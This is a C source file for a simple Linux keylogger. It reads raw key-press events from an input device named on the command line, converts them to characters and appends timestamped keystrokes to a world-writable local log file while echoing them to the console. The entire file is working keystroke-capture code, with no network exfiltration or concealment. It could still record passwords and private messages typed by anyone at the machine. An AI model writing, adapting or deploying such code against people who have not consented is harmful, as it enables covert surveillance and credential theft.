#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <dirent.h>
#include <linux/input-event-codes.h>
#include <linux/input.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/select.h>
#include <sys/time.h>
#include <glib.h>
#include <string.h>
#include "keymap.h"
#include "keylogger.h"

#define MAX_LEN 200

static int fd;
static int fd_log;
static struct input_event ev[64];
static char *buffer;

gboolean keylogger_read_event(void* data)
{
    int rd, i, size;

    size = sizeof (struct input_event),

    rd = read(fd, ev, size);

    if (rd < (int) sizeof(struct input_event))
    {
        return TRUE;
    }

    for (i = 0; i < rd / size; i++)
    {
        /* detect key press event */
        if (ev[i].type == EV_KEY && ev[i].value == REP_MAX)
        {
            buffer = g_strdup_printf ("%ld.%06ld code %d key %c\n",
                                      ev[i].time.tv_sec,
                                      ev[i].time.tv_usec,
                                      ev[i].code,
                                      keymap_get_key(ev[i].code));

            printf ("%s", buffer);

            int res = write (fd_log, buffer, strlen (buffer));

            if (res != strlen (buffer))
                printf ("An error occured while logging\n");

            free (buffer);
        }

        /* TODO: detect key release (useful for shift or capslock) */
    }

    return TRUE;
}

void keylogger_stop()
{
    close (fd);
    close (fd_log);
}

int keylogger_init (int argc, char *argv[])
{
    char name[256] = "Unknown";
    char *device = NULL;

    /* Setup check */
    if (argv[1] == NULL){
        printf ("Specify path to device\n");
        exit (0);
    }

    if ((getuid ()) != 0)
        printf ("Needs to be run as root\n");

    if (argc > 1)
        device = argv[1];

    if ((fd_log = open ("keyboard-data.log", O_RDWR | O_CREAT, 0666)) == -1)
        printf ("Error opening log file");

    /* Open Device */
    if ((fd = open (device, O_RDONLY | O_NONBLOCK)) == -1)
        printf ("%s is not a valid device\n", device);

    /* Print Device Name */
    ioctl (fd, EVIOCGNAME (sizeof (name)), name);
    printf ("Reading from: %s %s\n", device, name);

    keymap_init_map ();

    return 0;
}